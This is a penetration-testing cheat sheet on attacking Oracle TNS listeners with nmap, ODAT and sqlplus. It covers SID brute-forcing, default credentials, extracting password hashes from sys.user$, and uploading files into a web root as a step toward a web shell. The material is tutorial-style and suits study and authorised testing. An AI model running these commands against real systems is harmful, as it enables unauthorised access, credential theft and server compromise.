**Overview:**
- Oracle TNS is a communication protocol for Oracle databases, operating on TCP port 1521. Supports TCP/IP and IPX/SPX, and includes a built-in encryption layer over TCP/IP for client-server communication.
- Configuration is split between two files in `$ORACLE_HOME/network/admin`: `tnsnames.ora` (client-side, resolves service names to network addresses) and `listener.ora` (server-side, defines listener behavior and which services to accept).
- ODAT (Oracle Database Attacking Tool) is the primary pentesting tool for Oracle. It enumerates database names, versions, running processes, user accounts, and vulnerabilities, and supports exploitation including file upload and RCE.
- Known default credentials to test: Oracle 9 uses `CHANGE_ON_INSTALL`, Oracle DBSNMP uses `dbsnmp`. Oracle 10+ has no default password but the `sa`-equivalent `scott/tiger` pair is commonly found in test environments.
- SIDs (System Identifiers) uniquely identify database instances on a server. Brute-forcing SIDs is often a required first step before authentication attempts.
---
## Setup

```bash
sudo apt-get install -y build-essential python3-dev libaio1
wget https://files.pythonhosted.org/packages/source/c/cx_Oracle/cx_Oracle-8.3.0.tar.gz
tar xzf cx_Oracle-8.3.0.tar.gz && cd cx_Oracle-8.3.0
python3 setup.py build && sudo python3 setup.py install
cd ~ && git clone https://github.com/quentinhardy/odat.git && cd odat/
pip install python-libnmap
git submodule init && git submodule update
sudo apt-get install python3-scapy build-essential libgmp-dev -y
sudo pip3 install colorlog termcolor passlib python-libnmap pycryptodome
```

Install cx_Oracle and ODAT with all required dependencies.

```bash
./odat.py -h
```

Verify ODAT installed correctly.

---
## Enumeration

```bash
sudo nmap -p1521 -sV --open <target>
```

Scan for Oracle TNS listener and retrieve version info.

```bash
sudo nmap -p1521 -sV --open --script oracle-sid-brute <target>
```

Brute-force valid SIDs on the target. SIDs are required before authentication.

```bash
./odat.py all -s <target>
```

Run all ODAT modules against the target. Returns database names, versions, running processes, user accounts, and misconfigurations.

---
## Connection

```bash
sqlplus <user>/<password>@<target>/<SID>
```

Example:

```bash
sqlplus scott/tiger@192.0.2.60/ORCL
```

Connect to the Oracle database using SQLPlus.

```bash
sqlplus <user>/<password>@<target>/<SID> as sysdba
```

Connect as SYSDBA for elevated privileges. Possible if the user has been granted the appropriate role.

---
## Database Enumeration

|Command|Description|
|---|---|
|`select table_name from all_tables;`|List all accessible tables|
|`select * from user_role_privs;`|Show roles granted to the current user|
|`select name, password from sys.user$;`|Extract password hashes (requires SYSDBA)|

---
## Web Shell Upload

Default web root paths by OS:

|OS|Path|
|---|---|
|Linux|`/var/www/html`|
|Windows|`C:\inetpub\wwwroot`|

```bash
echo "Oracle File Upload Test" > testing.txt
./odat.py utlfile -s <target> -d <SID> -U <user> -P <password> --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
```

Upload a file to the web root using ODAT's `utlfile` module. Requires SYSDBA and a running web server.

```bash
curl -X GET http://<target>/testing.txt
```

Verify the file was uploaded successfully.